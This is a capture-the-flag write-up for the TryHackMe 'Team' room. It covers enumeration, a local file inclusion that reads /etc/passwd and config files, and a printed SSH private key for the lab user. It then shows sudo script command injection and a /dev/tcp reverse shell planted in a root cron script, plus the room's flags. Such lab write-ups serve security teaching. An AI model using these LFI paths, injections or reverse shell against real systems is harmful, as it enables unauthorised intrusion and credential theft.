# Room: Team

## General Info
- **Room link:** [Team](https://tryhackme.com/room/teamcw)

## Description

Hey all this is my first box! It is aimed at beginners as I often see boxes that are "easy" but are often a bit harder!

## Provided Files / Links
- [x] Target Machine IP (10.10.229.165)

## Enumeration / Recon

- Port Enumeration:
` nmap -sV 10.10.229.165 -p- -T5`

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

I try to access the ftp as anonymous but anonymous access is disabled.

- Directory Enumeration

I try a lot of different wordlists but I cannot find any available directory.

## Website

Since there nothing relevant has been found in the previous steps, I access the website and notice this in the title of the tab:

```
Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!
```

I then proceeded to add team.thm to the /etc/hosts file and I go visit http://team.thm.

The website is created with a CMS called templated (www.templated.co).

- Directory enumeration

```
gobuster dir -u http://team.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt -t 100
```

```
/index.html           (Status: 200) [Size: 2966]
/.htaccess            (Status: 403) [Size: 273]
/robots.txt           (Status: 200) [Size: 5]
/.                    (Status: 200) [Size: 2966]
/.html                (Status: 403) [Size: 273]
/.php                 (Status: 403) [Size: 273]
/.htpasswd            (Status: 403) [Size: 273]
/.htm                 (Status: 403) [Size: 273]
/.htpasswds           (Status: 403) [Size: 273]
/.htgroup             (Status: 403) [Size: 273]
/wp-forum.phps        (Status: 403) [Size: 273]
/.htaccess.bak        (Status: 403) [Size: 273]
/.htuser              (Status: 403) [Size: 273]
/.htc                 (Status: 403) [Size: 273]
/.ht                  (Status: 403) [Size: 273]
```

I had a look at /robots.txt and found the username `dale`.

I first tried to bruteforce the ftp and ssh services with this new username but I couldn't manage to find a password.

Then I tried to fuzz the virtual host to find a subdomain:

```
wfuzz -c --hw 977 -u http://team.thm -H "Host: FUZZ.team.thm" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

And I managed to get a hit:

```
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                   
=====================================================================

000000001:   200        89 L     220 W      2966 Ch     "www"                                                                                     
000000019:   200        9 L      20 W       187 Ch      "dev"                                                                                     
000000085:   200        9 L      20 W       187 Ch      "www.dev"                                                                                 
000000689:   400        12 L     53 W       422 Ch      "gc._msdcs"
```

After adding this new subdomain to my /etc/hosts, I want to dev.team.thm and notice that you can access the following url:

```
http://dev.team.thm/script.php?page=teamshare.php
```

I try for Local File Inclusion with `http://dev.team.thm/script.php?page=../../../../etc/passwd` and I get a hit.

I try to read user.txt in dale's home directory and I actually find it:

```
http://dev.team.thm/script.php?page=../../../../home/dale/user.txt
```

**THM{6Y0TXHz7c2d}**

Since there is LFI, I will try fuzzing with interesting files (LFI-gracefulsecurity-linux.txt in SecLists) with wfuzz:

```
wfuzz -c -z file,/usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hh 1 --hl 1 "http://dev.team.thm/script.php?page=../../../../FUZZ"
```

```
000000001:   200        34 L     42 W       1698 Ch     "/etc/passwd"                                                                             
000000015:   200        15 L     123 W      721 Ch      "/etc/crontab"                                                                            
000000018:   200        10 L     68 W       424 Ch      "/etc/fstab"                                                                              
000000005:   200        230 L    1119 W     7313 Ch     "/etc/apache2/apache2.conf"                                                               
000000026:   200        18 L     111 W      712 Ch      "/etc/hosts.deny"                                                                         
000000052:   200        3 L      12 W       92 Ch       "/etc/networks"                                                                           
000000051:   200        5 L      16 W       91 Ch       "/etc/network/interfaces"                                                                 
000000047:   200        34 L     198 W      2454 Ch     "/etc/mtab"                                                                               
000000044:   200        5 L      6 W        104 Ch      "/etc/lsb-release"                                                                        
000000038:   200        3 L      5 W        25 Ch       "/etc/issue"                                                                              
000000025:   200        11 L     57 W       412 Ch      "/etc/hosts.allow"                                                                        
000000024:   200        8 L      22 W       185 Ch      "/etc/hosts"                                                                              
000000102:   200        34 L     59 W       391 Ch      "/proc/filesystems"                                                                       
000000104:   200        24 L     80 W       555 Ch      "/proc/ioports"                                                                           
000000103:   200        35 L     192 W      1866 Ch     "/proc/interrupts"                                                                        
000000101:   200        57 L     364 W      2063 Ch     "/proc/cpuinfo"                                                                           
000000091:   200        160 L    955 W      5937 Ch     "/etc/vsftpd.conf"                                                                        
000000081:   200        169 L    447 W      5990 Ch     "/etc/ssh/sshd_config"                                                                    
000000080:   200        52 L     218 W      1581 Ch     "/etc/ssh/ssh_config"                                                                     
000000077:   200        19 L     113 W      736 Ch      "/etc/resolv.conf"                                                                        
000000067:   200        28 L     97 W       582 Ch      "/etc/profile"                                                                            
000000111:   200        3 L      15 W       157 Ch      "/proc/self/net/arp"                                                                      
000000105:   200        49 L     140 W      1336 Ch     "/proc/meminfo"                                                                           
000000107:   200        34 L     198 W      2454 Ch     "/proc/mounts"                                                                            
000000109:   200        3 L      10 W       102 Ch      "/proc/swaps"                                                                             
000000110:   200        2 L      17 W       147 Ch      "/proc/version"                                                                           
000000106:   200        77 L     456 W      4297 Ch     "/proc/modules"                                                                           
000000108:   200        11 L     497 W      1204 Ch     "/proc/stat"                                                                              
000000221:   200        2 L      4 W        1537 Ch     "/var/run/utmp"                                                                           
000000217:   200        13 L     105 W      62955 Ch    "/var/log/wtmp"                                                                           
000000264:   200        89 L     467 W      3029 Ch     "/etc/adduser.conf"                                                                       
000000284:   200        28 L     139 W      823 Ch      "/etc/apache2/mods-available/proxy.conf"                                                  
000000312:   200        145 L    207 W      5890 Ch     "/etc/ca-certificates.conf"                                                               
000000306:   200        72 L     329 W      2320 Ch     "/etc/bash.bashrc"                                                                        
000000294:   200        16 L     46 W       321 Ch      "/etc/apache2/ports.conf"                                                                 
000000293:   200        30 L     102 W      750 Ch      "/etc/apache2/mods-enabled/status.conf"                                                   
000000290:   200        252 L    1128 W     7677 Ch     "/etc/apache2/mods-enabled/mime.conf"                                                     
000000289:   200        6 L      18 W       158 Ch      "/etc/apache2/mods-enabled/dir.conf"                                                      
000000291:   200        21 L     124 W      725 Ch      "/etc/apache2/mods-enabled/negotiation.conf"                                              
000000288:   200        11 L     31 W       396 Ch      "/etc/apache2/mods-enabled/deflate.conf"                                                  
000000287:   200        25 L     131 W      844 Ch      "/etc/apache2/mods-enabled/alias.conf"                                                    
000000286:   200        86 L     442 W      3111 Ch     "/etc/apache2/mods-available/ssl.conf"                                                    
000000283:   200        252 L    1128 W     7677 Ch     "/etc/apache2/mods-available/mime.conf"                                                   
000000285:   200        33 L     139 W      1281 Ch     "/etc/apache2/mods-available/setenvif.conf"                                               
000000279:   200        97 L     392 W      3375 Ch     "/etc/apache2/mods-available/autoindex.conf"                                              
000000281:   200        6 L      18 W       158 Ch      "/etc/apache2/mods-available/dir.conf"                                                    
000000280:   200        11 L     31 W       396 Ch      "/etc/apache2/mods-available/deflate.conf"                                                
000000277:   200        48 L     227 W      1783 Ch     "/etc/apache2/envvars"                                                                    
000000327:   200        34 L     165 W      1203 Ch     "/etc/default/grub"                                                                       
000000343:   200        139 L    819 W      4862 Ch     "/etc/hdparm.conf"                                                                        
000000345:   200        2 L      1 W        6 Ch        "/etc/hostname"                                                                           
000000344:   200        4 L      18 W       93 Ch       "/etc/host.conf"                                                                          
000000342:   200        61 L     60 W       829 Ch      "/etc/group-"                                                                             
000000341:   200        61 L     60 W       835 Ch      "/etc/group"                                                                              
000000340:   200        9 L      43 W       281 Ch      "/etc/fuse.conf"                                                                          
000000339:   200        15 L     22 W       133 Ch      "/etc/ftpusers"                                                                           
000000178:   200        5332 L   31922 W    364050 Ch   "/var/log/dpkg.log"                                                                       
000000196:   200        5 L      18 W       292866 Ch   "/var/log/lastlog"                                                                        
000000329:   200        55 L     207 W      1736 Ch     "/etc/dhcp/dhclient.conf"                                                                 
000000326:   200        2 L      1 W        12 Ch       "/etc/debian_version"                                                                     
000000328:   200        21 L     99 W       605 Ch      "/etc/deluser.conf"                                                                       
000000325:   200        84 L     485 W      2970 Ch     "/etc/debconf.conf"                                                                       
000000318:   200        2 L      8 W        55 Ch       "/etc/crypttab"                                                                           
000000380:   200        6 L      36 W       196 Ch      "/etc/modules"                                                                            
000000374:   200        132 L    715 W      5175 Ch     "/etc/manpath.config"                                                                     
000000371:   200        544 L    1307 W     14868 Ch    "/etc/ltrace.conf"                                                                        
000000362:   200        2 L      3 W        18 Ch       "/etc/issue.net"                                                                          
000000364:   200        7 L      22 W       145 Ch      "/etc/kernel-img.conf"                                                                    
000000370:   200        37 L     114 W      704 Ch      "/etc/logrotate.conf"                                                                     
000000367:   200        18 L     40 W       333 Ch      "/etc/ldap/ldap.conf"                                                                     
000000369:   200        342 L    1753 W     10551 Ch    "/etc/login.defs"                                                                         
000000366:   200        3 L      2 W        35 Ch       "/etc/ld.so.conf"                                                                         
000000429:   200        57 L     347 W      2151 Ch     "/etc/security/limits.conf"                                                               
000000430:   200        29 L     217 W      1441 Ch     "/etc/security/namespace.conf"                                                            
000000426:   200        107 L    663 W      3636 Ch     "/etc/security/group.conf"                                                                
000000422:   200        123 L    802 W      4621 Ch     "/etc/security/access.conf"                                                               
000000401:   200        34 L     42 W       1696 Ch     "/etc/passwd-"                                                                            
000000399:   200        16 L     59 W       553 Ch      "/etc/pam.conf"                                                                           
000000397:   200        13 L     17 W       383 Ch      "/etc/os-release"                                                                         
000000471:   200        5 L      45 W       404 Ch      "/etc/updatedb.conf"                                                                      
000000467:   200        2 L      1 W        15 Ch       "/etc/timezone"                                                                           
000000464:   200        13 L     69 W       510 Ch      "/etc/sysctl.d/10-network-security.conf"                                                  
000000463:   200        4 L      14 W       78 Ch       "/etc/sysctl.d/10-console-messages.conf"                                                  
000000462:   200        78 L     339 W      2684 Ch     "/etc/sysctl.conf"                                                                        
000000435:   200        66 L     412 W      2180 Ch     "/etc/security/time.conf"                                                                 
000000432:   200        74 L     499 W      2973 Ch     "/etc/security/pam_env.conf"                                                              
000000434:   200        12 L     70 W       420 Ch      "/etc/security/sepermit.conf"                                                             
000000577:   200        54 L     129 W      1265 Ch     "/proc/self/status"                                                                       
000000576:   200        2 L      52 W       321 Ch      "/proc/self/stat"                                                                         
000000575:   200        34 L     198 W      2454 Ch     "/proc/self/mounts"                                                                       
000000554:   200        57 L     110 W      526 Ch      "/proc/devices"                                                                           
000000556:   200        4 L      41 W       385 Ch      "/proc/net/udp"                                                                           
000000555:   200        4 L      46 W       451 Ch      "/proc/net/tcp"                                                                           
000000730:   200        89 L     467 W      3029 Ch     "/usr/share/adduser/adduser.conf" 
```

Among all these results, I find dale's id_rsa in /etc/ssh/sshd_config:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

I create an id_rsa key on my machine, change the file permission (`chmod 600 id_rsa`) and connect to the machine via ssh:

```
ssh -i id_rsa dale@10.10.229.165
``` 

I am now logged in as dale in the target machine. I then check dale's groups with id:

```
uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors)
```

And check for sudo permissions (`sudo -l`):

```
User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

When looking at the admin_checks script, I notice that there can be command injection in the error variable.

```
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

I enter `/bin/bash` when prompted for the date and I am now gyles.

I stabilize the shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

I ran linpeas.sh as this user and got the following results:

```
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                        
                            ╚═════════════════════════╝                                                                                                    
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                   
/usr/local/sbin/dev_backup.sh                                                                                                                              
You can write script: /usr/local/bin/main_backup.sh
```
It seems like this bash script runs with a CRON.

In the main_backup.sh script, I add a reverse shell script:

```
/bin/bash -i >& /dev/tcp/MY-IP/1337 0>&1
```

And set up a listener on my machine `nc -lnvp 1337`.

After a couple of seconds, I get a shell as root on my machine.

I can now see the content of the /root/root.txt file: **THM{fhqbznavfonq}**.
